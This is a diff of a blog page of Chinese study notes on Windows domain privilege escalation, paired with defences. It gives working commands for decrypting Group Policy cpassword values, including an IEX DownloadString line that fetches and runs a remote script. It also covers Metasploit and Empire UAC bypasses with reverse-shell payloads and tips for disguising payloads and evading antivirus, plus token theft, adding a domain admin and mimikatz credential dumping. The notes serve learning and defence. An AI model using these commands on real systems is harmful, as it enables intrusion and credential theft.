@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>内网学习笔记四-权限提升分析及防御 | RainMaker</title>
+    <title>内网学习笔记四 | 权限提升分析及防御 | RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckywch8o0007leo4z3sl23aha" class="article article-type-post" itemscope
+    <article id="post-ckz2uv1rh007r944zbntlgi9y" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -147,7 +147,7 @@
             
   
     <h1 class="article-title" itemprop="name">
-      内网学习笔记四-权限提升分析及防御
+      内网学习笔记四 | 权限提升分析及防御
     </h1>
   
 
@@ -789,7 +789,7 @@ accesschk.exe <span class="hljs-literal">-uwqs</span> <span class="hljs-string">
 <pre><code class="hljs powershell">python3 schtasks_check.py</code></pre>
 
 <ul>
-<li>在目标机器没有python环境时，可以导出计划任务详情，在本机借用以上脚本生成单独的计划任务路径信息，之后上次目标机器使用批处理对路径进行检查。</li>
+<li>在目标机器没有python环境时，可以导出计划任务详情，在本机用以上脚本生成单独的计划任务路径信息，之后上次目标机器使用批处理对路径进行检查。</li>
 </ul>
 <pre><code class="hljs powershell"><span class="hljs-comment"># 导出目标机器计划任务情况，注意文件编码调整为UTF-8</span>
 schtasks /query /fo LIST /v &gt; task.txt
@@ -834,7 +834,267 @@ execute</code></pre>
 <li>创建/更新服务（<code>Services.xml</code>）</li>
 <li>计划任务（<code>ScheduledTasks.xml</code>）</li>
 </ul>
-<h3 id="4-3-2-组策略首选项提权分析"><a href="#4-3-2-组策略首选项提权分析" class="headerlink" title="4.3.2 组策略首选项提权分析"></a>4.3.2 组策略首选项提权分析</h3><h3 id="4-4-3-针对组策略首选项提权的防御"><a href="#4-4-3-针对组策略首选项提权的防御" class="headerlink" title="4.4.3 针对组策略首选项提权的防御"></a>4.4.3 针对组策略首选项提权的防御</h3><h2 id="4-4-绕过UAC-提权分析及防范"><a href="#4-4-绕过UAC-提权分析及防范" class="headerlink" title="4.4 绕过UAC 提权分析及防范"></a>4.4 绕过UAC 提权分析及防范</h2><h3 id="4-4-1-UAC简介"><a href="#4-4-1-UAC简介" class="headerlink" title="4.4.1 UAC简介"></a>4.4.1 UAC简介</h3><h3 id="4-4-2-BypassUAC-模块"><a href="#4-4-2-BypassUAC-模块" class="headerlink" title="4.4.2 BypassUAC 模块"></a>4.4.2 BypassUAC 模块</h3><h3 id="4-4-3-RunAs-模块"><a href="#4-4-3-RunAs-模块" class="headerlink" title="4.4.3 RunAs 模块"></a>4.4.3 RunAs 模块</h3><h3 id="4-4-4-Nishang-中的Invoke-PsUACme"><a href="#4-4-4-Nishang-中的Invoke-PsUACme" class="headerlink" title="4.4.4 Nishang 中的Invoke-PsUACme"></a>4.4.4 Nishang 中的Invoke-PsUACme</h3><h3 id="4-4-5-Empire-中的BypassUAC模块"><a href="#4-4-5-Empire-中的BypassUAC模块" class="headerlink" title="4.4.5 Empire 中的BypassUAC模块"></a>4.4.5 Empire 中的BypassUAC模块</h3><h3 id="4-4-6-针对UAC提权的防御分析"><a href="#4-4-6-针对UAC提权的防御分析" class="headerlink" title="4.4.6 针对UAC提权的防御分析"></a>4.4.6 针对UAC提权的防御分析</h3><h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><h3 id="4-5-1-令牌窃取"><a href="#4-5-1-令牌窃取" class="headerlink" title="4.5.1 令牌窃取"></a>4.5.1 令牌窃取</h3><h3 id="4-5-2-Rotten-Potato-本地提权分析"><a href="#4-5-2-Rotten-Potato-本地提权分析" class="headerlink" title="4.5.2 Rotten Potato 本地提权分析"></a>4.5.2 Rotten Potato 本地提权分析</h3><h3 id="4-5-3-添加域管理员"><a href="#4-5-3-添加域管理员" class="headerlink" title="4.5.3 添加域管理员"></a>4.5.3 添加域管理员</h3><h3 id="4-5-4-Empire下的令牌窃取"><a href="#4-5-4-Empire下的令牌窃取" class="headerlink" title="4.5.4 Empire下的令牌窃取"></a>4.5.4 Empire下的令牌窃取</h3><h3 id="4-5-5-针对令牌窃取提权的防御分析"><a href="#4-5-5-针对令牌窃取提权的防御分析" class="headerlink" title="4.5.5 针对令牌窃取提权的防御分析"></a>4.5.5 针对令牌窃取提权的防御分析</h3><h2 id="4-6-无凭证条件下的权限分析及防范"><a href="#4-6-无凭证条件下的权限分析及防范" class="headerlink" title="4.6 无凭证条件下的权限分析及防范"></a>4.6 无凭证条件下的权限分析及防范</h2><h3 id="4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念"><a href="#4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念" class="headerlink" title="4.6.1 LLMNR 和NetBIOS欺骗攻击的基本概念"></a>4.6.1 LLMNR 和NetBIOS欺骗攻击的基本概念</h3><h3 id="4-6-2-LLMNR和NetBIOS欺骗攻击分析"><a href="#4-6-2-LLMNR和NetBIOS欺骗攻击分析" class="headerlink" title="4.6.2 LLMNR和NetBIOS欺骗攻击分析"></a>4.6.2 LLMNR和NetBIOS欺骗攻击分析</h3>
+<h3 id="4-3-2-组策略首选项提权分析"><a href="#4-3-2-组策略首选项提权分析" class="headerlink" title="4.3.2 组策略首选项提权分析"></a>4.3.2 组策略首选项提权分析</h3><h4 id="1-创建组策略"><a href="#1-创建组策略" class="headerlink" title="1. 创建组策略"></a>1. 创建组策略</h4><p><code>Win + R</code> 运行 <code>gpedit.msc</code>(<code>windows2003</code>的话就是<code>dsa.msc</code>)，右键组策略对象新建test：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220127115548152.png" alt="(image-20220127115548152)"></p>
+<p>之后编辑，选择更新内置的administrator密码，不过测试下来本地管理员账户密码并没有被修改，刷新策略也没用，暂未找到原因，有了解的大哥可以指点一下。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220127222254536.png" alt="image-20220127222254536"></p>
+<h4 id="2-获取组策略凭据"><a href="#2-获取组策略凭据" class="headerlink" title="2. 获取组策略凭据"></a>2. 获取组策略凭据</h4><p>​        管理员在域中新建一个组策略后，操作系统会自动在 <code>SYSVOL</code> 共享目录中生成一个 <code>XML</code>文件，该文件中保存了该组策略更新后的密码。该密码使用<code>AES-256</code>加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在<code>XML</code>文件中的密码的安全性大大降低。任何域用户和域信任的用户均可对该共享目标进行访问，这就意味着，任何用户都可以访问保存在 <code>XML</code> 文件中的密码并将其解密，从而控制域中所有使用该账户/密码的本地管理员计算机。在<code> SYSVOL</code> 中搜索，可以找到包含 <code>cpassword</code> 的 XML 文件。</p>
+<h5 id="2-1-手动查找"><a href="#2-1-手动查找" class="headerlink" title="2.1 手动查找"></a>2.1 手动查找</h5><p>远程连接共享查看：</p>
+<pre><code class="hljs powershell"><span class="hljs-built_in">type</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">2.20</span>\sysvol\test.com\Policies\&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D</span><span class="hljs-literal">-11D2</span><span class="hljs-literal">-945F</span><span class="hljs-literal">-00C04FB984F9</span>&#125;\MACHINE\Preferences\Groups\Groups.xml</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128093720830.png" alt="image-20220128093720830"></p>
+<p>对<code>cpassword</code>字段解密：</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kali自带工具</span>
+gpp-decrypt 7ud2rxJhwxT5iaNrNltLxTsE79YZ9JxpZ3rL7k9HJQ0</code></pre>
+
+<p>使用<code>ruby</code>脚本解密也可以，repo:<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC">https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC</a></p>
+<h5 id="2-2-借助PowerSploit的脚本Get-GPPPassword-ps1"><a href="#2-2-借助PowerSploit的脚本Get-GPPPassword-ps1" class="headerlink" title="2.2 借助PowerSploit的脚本Get-GPPPassword.ps1"></a>2.2 借助<code>PowerSploit</code>的脚本<code>Get-GPPPassword.ps1</code></h5><p>repo:<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<pre><code class="hljs powershell"><span class="hljs-comment"># 远程加载，会被 Windows defender 查杀</span>
+powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>
+<span class="hljs-comment"># 本地执行</span>
+<span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Get-GPPPassword</span>.ps1;<span class="hljs-built_in">Get-GPPPassword</span></code></pre>
+
+<h5 id="2-3-借助-metasploit"><a href="#2-3-借助-metasploit" class="headerlink" title="2.3 借助 metasploit"></a>2.3 借助 <code>metasploit</code></h5><pre><code class="hljs shell">use post/windows/gather/credentials/gpp
+set session 1
+run</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128112649121.png" alt="image-20220128112649121"></p>
+<h5 id="2-5-借助Empire模块privesc-gpp"><a href="#2-5-借助Empire模块privesc-gpp" class="headerlink" title="2.5 借助Empire模块privesc/gpp"></a>2.5 借助<code>Empire</code>模块<code>privesc/gpp</code></h5><pre><code class="hljs shell">usemodule privesc/gpp</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220128140629730.png" alt="image-20220128140629730"></p>
+<p>除了 <code>Groups.xml</code>，还有几个组策略首选项文件中有可选的 <code>cpassword </code>属性，列举如下:</p>
+<ul>
+<li><code>Services\Services.xml</code></li>
+<li><code>ScheduledTasks\ScheduledTasks.xml</code></li>
+<li><code>Printers\Printers.xml</code></li>
+<li><code>Drives\Drives.xml</code></li>
+<li><code>DataSources\DataSources.xml</code></li>
+</ul>
+<h3 id="4-4-3-针对组策略首选项提权的防御"><a href="#4-4-3-针对组策略首选项提权的防御" class="headerlink" title="4.4.3 针对组策略首选项提权的防御"></a>4.4.3 针对组策略首选项提权的防御</h3><p>在用于管理组策略的计算机上安装 <code>KB2962486</code> 补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。此外，需要对Everyone 访问权限进行设置，具体如下:</p>
+<ul>
+<li>设置共享文件夹<code>SYSVOL</code>的访问权限。</li>
+<li>将包含组策略密码的<code>XML</code>文件从<code>SYSVOL</code>目录中删除。</li>
+<li>不要把密码放在所有域用户都有权访问的文件中。</li>
+<li>如果需要更改域中机器的本地管理员密码，建议使用<code>LAPS</code>。</li>
+</ul>
+<h2 id="4-4-绕过UAC-提权分析及防范"><a href="#4-4-绕过UAC-提权分析及防范" class="headerlink" title="4.4 绕过UAC 提权分析及防范"></a>4.4 绕过UAC 提权分析及防范</h2><p>如果计算机的操作系统版本是<code>Windows Vista</code>或更高，在权限不够的情况下，访问系统磁盘的根目录（例如<code>C：\\Windows</code>目录、<code>Program Files</code> 目录，以及读、写系统登录数据库（<code>Registry</code>）的程序等操作，都需要经过 <code>UAC</code>（<code>User Account Control</code>，用户账户控制）的认证才能进行。</p>
+<h3 id="4-4-1-UAC简介"><a href="#4-4-1-UAC简介" class="headerlink" title="4.4.1 UAC简介"></a>4.4.1 UAC简介</h3><p>​        <code>UAC</code>是微软为提高系统安全性在<code>Windows Vista</code>中引人的技术。<code>UAC</code> 要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。<code>UAC</code>在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
+<p>​        在 <code>Windows Vista</code> 及更高版本的操作系统中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。</p>
+<p>需要<code>UAC</code>的授权才能进行的操作列举如下:</p>
+<ul>
+<li>配置<code> Windows Update</code></li>
+<li>增加/删除账户。</li>
+<li>更改账户类型。</li>
+<li>更改<code>UAC</code>的设置。</li>
+<li>安装 <code>ActiveX</code>。</li>
+<li>安装/卸载程序。</li>
+<li>安装设备驱动程序。</li>
+<li>将文件移动/复制到<code>Program Files</code>或<code>Windows</code>目录下。</li>
+<li>查看其他用户的文件夹。</li>
+</ul>
+<p><code>UAC</code> 有如下四种设置要求:</p>
+<ul>
+<li>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户。</li>
+<li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要<br>使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提<br>示本地用户。</li>
+<li>仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置的要求相同，<br>但在提示用户时不降低桌面的亮度。</li>
+<li>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行。</li>
+</ul>
+<h3 id="4-4-2-BypassUAC-模块"><a href="#4-4-2-BypassUAC-模块" class="headerlink" title="4.4.2 BypassUAC 模块"></a>4.4.2 <code>BypassUAC</code> 模块</h3><p>​        在使用<code>bypassuac</code>模块进行提权时，当前用户必须在<strong>管理员组中</strong>，且<code>UAC</code>必须为默认设置（即“仅在程序试图更改我的计算机时通知我”)。当<code>bypassuac</code>模块运行时,会在目标机器上创建多个文件，这些文件会被杀毒软件识别。但因为 <code>exploit/windows/local/bypassuac_injection</code>模块直接运行在内存的反射<code>DLL</code>中(此模块通过内存注入使用可信任的发布者证书绕过UAC（该模块需要选择正确的体系架构）)，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。<code>Metasploit</code>框架没有提供针对<code>Windows 8</code>的渗透测试模块。</p>
+<p><strong>原理：</strong>此模块通过进程注入获得证书，并利用受信任的发布服务器绕过<code>Windows UAC</code> 。</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 使用injection模块</span>
+use exploit/windows/local/bypassuac_injection
+<span class="hljs-meta">#</span><span class="bash"> 不设置的话会报错，执行不成功</span>
+set payload windows/x64/meterpreter/reverse_tcp
+<span class="hljs-meta">#</span><span class="bash"> 设置目标系统架构</span>
+set target 1
+set session 1</code></pre>
+
+<p><code>bypassuac_injection</code> 模块支持<code>x86</code>和<code>x64</code>版本的<code>Windows 8、8.1、10_1511、10_1607、10_1703</code>。如果不设置<code>payload</code>会报错如下：<code>Exploit aborted due to failure: bad-config: x86 Target Selected for x64 System</code>，其实架构选择没问题。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104541567.png" alt="image-20220130104541567"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104631279.png" alt="image-20220130104631279"></p>
+<p>提权对比：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130104717878.png" alt="image-20220130104717878"></p>
+<h3 id="4-4-3-RunAs-模块"><a href="#4-4-3-RunAs-模块" class="headerlink" title="4.4.3 RunAs 模块"></a>4.4.3 <code>RunAs</code> 模块</h3><p><strong>前提：</strong>要想使用 <code>RunAs</code>模块进行提权，当前用户必须在管理员组中或者知道管理员的密码，对<code>UAC</code> 的设置则没有要求。</p>
+<p><strong>原理：</strong><code>This module will attempt to elevate execution level using the ShellExecute undocumented RunAs flag to bypass low UAC settings.</code></p>
+<p>使用<code>exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序（位置：<code>C:\Users\用户名\AppData\Local\Temp\MdIXXegVjPf.exe</code>），<strong>提示用户是否要继续运行</strong>，如果用户选择继续运行程序，就会返回一个高权限的<code>meterpreter Shell</code>。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129151122852.png" alt="image-20220129151122852"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129154355514.png" alt="image-20220129154355514"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129160202411.png" alt="image-20220129160202411"></p>
+<p><code>session 6</code>是返回高权限的<code>shell</code>，使用<code>getsystem</code>即可获取最高权限，可以对比<code>session 5</code>正常获取的<code>shell</code>是获取不到<code>system</code>权限的。</p>
+<p><strong>要点</strong>：</p>
+<ol>
+<li>在使用 <code>RunAs</code> 模块时，需要使用 <code>EXE::Custom</code> 选项创建一个可执行文件（需进行免杀处理）。</li>
+<li>随机的命名可能会引起怀疑，可以设置为<code>Firefox.exe，Chrome.exe，WindowsUpdate.exe</code>之类的。</li>
+</ol>
+<pre><code class="hljs shell">set filename Firefox.exe
+set path C:\\Users\\test\\Desktop
+set exe::custom /root/miansha.exe</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220129162432447.png" alt="image-20220129162432447"></p>
+<h3 id="4-4-4-Nishang-中的Invoke-PsUACme"><a href="#4-4-4-Nishang-中的Invoke-PsUACme" class="headerlink" title="4.4.4 Nishang 中的Invoke-PsUACme"></a>4.4.4 <code>Nishang</code> 中的<code>Invoke-PsUACme</code></h3><p><code>Invoke-PsUACme</code> 模块使用来自<code>UACME</code>项目的<code>DLL</code>绕过<code>UAC</code>。影像版本涉及<code>Windows 7/2008/8/2012/Vista X86/64</code>版本。<code>Win 10</code>自带的<code>wsua</code>程序由于不再支持<code>/extract</code>释放命令了，故不再适用。repo:<a target="_blank" rel="noopener" href="https://github.com/dowdyph0/UACME">https://github.com/dowdyph0/UACME</a></p>
+<p>参数说明：</p>
+<pre><code class="hljs powershell"><span class="hljs-comment"># 使用 Sysprep方法并执行默认的 Payload</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -Verbose&#125;&quot;</span>
+<span class="hljs-comment"># 使用oobe方法并执行默认的Payload</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Verbose&#125;&quot;</span>
+<span class="hljs-comment"># 使用-Payload参数，可以自行指定要执行的 Payload</span>
+powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Payload &#x27;powershell -windowstyle hidden -e YourEncodedPayload&#x27;&#125;&quot;</span>
+</code></pre>
+
+<p>参数说明：</p>
+<ul>
+<li><p><code>Payload</code>          要<code>bypass</code>的载荷</p>
+</li>
+<li><p><code>method</code>            <code>bypass</code>所使用的方法，默认是<code>sysprep</code></p>
+</li>
+<li><p><code>PayloadPath</code>  指定 <code>Payload</code> 的路径。</p>
+</li>
+<li><p><code>CustomD1164</code>（64位）可以自定义64位<code>DLL</code>文件</p>
+</li>
+<li><p><code>CustomDLL32</code>（32位）可以自定义32位<code>DLL</code>文件</p>
+</li>
+<li><p><code>$DllBytes64</code>   脚本中硬编码的默认 64 位<code> DLL</code></p>
+</li>
+<li><p><code>$DllBytes32</code>   脚本中硬编码的默认 32 位<code> DLL</code></p>
+</li>
+</ul>
+<p>除了上述说的<code>sysprep</code>方法，还有以下方法：<code>sysprep、oobe、ActionQueue、migwiz、cliconfg、winsat、mmc</code>。</p>
+<p>正常情况下<code>whoami /all</code>：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144842084.png" alt="image-20220130144842084"></p>
+<p>提权成功运行结果:</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144915465.png" alt="image-20220130144915465"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144939493.png" alt="image-20220130144939493"></p>
+<h3 id="4-4-5-Empire-中的-BypassUAC模块"><a href="#4-4-5-Empire-中的-BypassUAC模块" class="headerlink" title="4.4.5 Empire 中的 BypassUAC模块"></a>4.4.5 <code>Empire</code> 中的 <code>BypassUAC</code>模块</h3><h5 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1. bypassuac"></a>1. <code>bypassuac</code></h5><p>​        在 <code>Empire </code>中输入<code>usemodule powershell/privesc/bypassuac</code>命令，设置监听器的参数。执行<code>execute</code><br>命令，得到一个新的反弹 <code>Shell</code>，带星号的 <code>agents</code>就是提权成功:</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131170622961.png" alt="image-20220131170622961"></p>
+<h5 id="2-bypassuac-wscript"><a href="#2-bypassuac-wscript" class="headerlink" title="2. bypassuac_wscript"></a>2. <code>bypassuac_wscript</code></h5><p>​        该模块的大致工作原理是，使用<code>C:\Windows\wscript.exe</code> 执行<code>Payload</code>，即绕过<code>UAC</code>，以管理员权限执行<code>Payload</code>。该模块只适用于操作系统为<code>Windows7</code>的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</p>
+<pre><code class="hljs powershell">interact <span class="hljs-number">42</span>NUDT5B
+usemodule privesc/bypassuac_wscript
+<span class="hljs-built_in">set</span> Listener test
+run</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131195208479.png" alt="image-20220131195208479"></p>
+<h3 id="4-4-6-针对UAC提权的防御分析"><a href="#4-4-6-针对UAC提权的防御分析" class="headerlink" title="4.4.6 针对UAC提权的防御分析"></a>4.4.6 针对<code>UAC</code>提权的防御分析</h3><p>​        在企业网络环境中，防止绕过 <code>UAC</code> 的最好的方法是<strong>不让内网机器的使用者拥有本地管理员权限</strong>，从而降低系统遭受攻击的可能性。在家庭网络环境中，建议使用<strong>非管理员权限</strong>进行日常办公和娱乐等活动。使用本地管理员权限登录的用户，要将 <code>UAC</code> 设置为“始终通知”或者删除该用户的本地管理员权限（这样设置后，会像在<code>Windows Vista</code> 中一样，总是弹出警告）。另外，可以使用微软的<code>EMET</code>或<code>MalwareBytes</code>来更好地防范<code>0day</code>漏洞。</p>
+<p>​        对于<code>DLL</code>劫持<code>BypassUAC</code>来说，可以重命名或删除<code>Mcx2Prov.exe、 sysprep.exe、 cliconfg.exe、pwcreator.exe</code> 等可执行文件。</p>
+<h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><p>​        令牌（<code>Token</code>）是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中（除非系统重新启动）。</p>
+<p>​        令牌的最大特点是随机性和不可预测性。一般的攻击者或软件都无法将令牌猜测出来。访问令牌（Access Token）代表访问控制操作主体的系统对象。密保令牌（<code>Security Tolten</code>）也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。会话令牌（Session Token）是交互会话中唯一的身份标识符。</p>
+<p>​        伪造令牌攻击的核心是<code>Kerberos</code>协议。<code>Kerberos</code>是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。<code>Kerberos</code> 协议的工作机制如下:</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131185944615.png" alt="image-20220131185944615"></p>
+<p>客户端请求证书的过程如下：</p>
+<ol>
+<li>客户端向认证服务器发送请求，要求得到证书。</li>
+<li>认证服务器收到请求后，将包含客户端密钥的加密证书发送给客户端。该证书包含服务器<br>Ticket（包含由服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称为会话<br>密钥，Session Key )。当然，认证服务器也会向服务器发送一份该证书，使服务器能够验证登录的<br>客户端的身份。</li>
+<li>客户端将 Ticket 传送给服务器。如果服务器确认该客户端的身份，就允许它登录服务器。<br>客户端登录服务器后，攻击者就能通过人侵服务器来窃取客户端的令牌。</li>
+</ol>
+<h3 id="4-5-1-令牌窃取"><a href="#4-5-1-令牌窃取" class="headerlink" title="4.5.1 令牌窃取"></a>4.5.1 令牌窃取</h3><p>​        假设已经获得了目标机器的 <code>meterpreter Shell</code>。首先输入<code>use incognito</code>命令，然后输入<br><code>list_tokens -u</code>命令，列出可用的令牌：</p>
+<p><code>Windows</code>有两种类型的令牌：</p>
+<ul>
+<li><p><code>Delegation Tokens</code></p>
+<p>授权令牌，它支持交互式登录（例如，可以通过远程桌面登录及访问）；</p>
+</li>
+<li><p><code>Impersonation Tokens</code></p>
+<p>模拟令牌，它支持非交互式的会话。</p>
+</li>
+</ul>
+<p>令牌的数量其实取决于 <code>meterpreter Shell</code>的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。两种<code>token</code>只在<strong>系统重启后清除</strong>，具有<code>Delegation token</code>的用户在注销后，该<code>Token</code>将变成<code>Impersonation token</code>，依旧有效。</p>
+<p>注意：在输人<code>主机名＼用户名</code>时，需要输人两个反斜杠<code>\\</code>。</p>
+<pre><code class="hljs plaintext"># 首先要提权
+use exploit/windows/local/bypassuac
+set session 2
+run
+# 加载伪装模块
+use incognito
+# 列出可用令牌
+list_tokens -u
+# 恢复权限
+rev2self</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131223826391.png" alt="image-20220131223826391"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131223846568.png" alt="image-20220131223846568"></p>
+<h3 id="4-5-2-Rotten-Potato-本地提权分析"><a href="#4-5-2-Rotten-Potato-本地提权分析" class="headerlink" title="4.5.2 Rotten Potato 本地提权分析"></a>4.5.2 <code>Rotten Potato</code> 本地提权分析</h3><p>如果目标系统中存在有效的令牌，可以通过<code>Rotten Potato</code> 程序快速模拟用户令牌来实现权限的提升。</p>
+<p>repo：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 加载模块</span>
+use incognito
+<span class="hljs-meta">#</span><span class="bash"> 列出可用令牌</span>
+list_tokens -u
+<span class="hljs-meta">#</span><span class="bash"> 上传烂土豆</span>
+upload /root/RottenPotato/rottenpotato.exe
+<span class="hljs-meta">#</span><span class="bash"> 执行</span>
+execuce -HC -f rottenpotato.exe 
+<span class="hljs-meta">#</span><span class="bash"> 窃取token</span>
+impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code></pre>
+
+<h3 id="4-5-3-添加域管理员"><a href="#4-5-3-添加域管理员" class="headerlink" title="4.5.3 添加域管理员"></a>4.5.3 添加域管理员</h3><p>​        假设网络中设置了域管理进程，在 <code>meterpreter</code> 会话窗口中输人<code>ps</code>命令，查看系统进程。找到域管理进程，并使用<code>migrate</code> 命令迁移到该进程。在 <code>meterpreter</code> 控制台中输入<code>shell</code>，进入命令行界面。输入如下命令:</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查看域管理员的进程</span>
+ps
+<span class="hljs-meta">#</span><span class="bash"> 迁移进程</span>
+migrate &lt;域管理员进程&gt;
+<span class="hljs-meta">#</span><span class="bash"> 添加域用户</span>
+net user test01 qqq@111 /add /domain
+<span class="hljs-meta">#</span><span class="bash"> 添加到管理员组</span>
+net group &quot;domain admins&quot; test01 /add /domain
+<span class="hljs-meta">#</span><span class="bash"> 查看域管理员</span>
+net group &quot;domain admins&quot; /domain</code></pre>
+
+<p>同样，在 <code>meterpreter</code>中可以使用 <code>incognito</code> 来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员。在活动的 <code>meterpreter</code> 会话中执行如下命令，在域控主机上添加一个账户。</p>
+<pre><code class="hljs powershell">add_user test01 qqq@<span class="hljs-number">111</span>  <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.26</span>
+add_group_user <span class="hljs-string">&quot;Domain Admins&quot;</span> test01 <span class="hljs-literal">-h</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.26</span></code></pre>
+
+
+
+<h3 id="4-5-4-Empire下的令牌窃取"><a href="#4-5-4-Empire下的令牌窃取" class="headerlink" title="4.5.4 Empire下的令牌窃取"></a>4.5.4 <code>Empire</code>下的令牌窃取</h3><p>​        在<code>Empire</code>下获取服务器权限后，可以使用内置的 <code>mimikatz</code> 工具获取系统密码。运行 <code>mimikatz</code>，输入<code>creds</code>命令，即可查看 <code>Empire</code> 列举出来的密码：</p>
+<pre><code class="hljs powershell">usemodule privesc/bypassuac
+<span class="hljs-built_in">set</span> Listener test
+run
+mimikatz
+creds</code></pre>
+
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131205413922.png" alt="image-20220131205413922"></p>
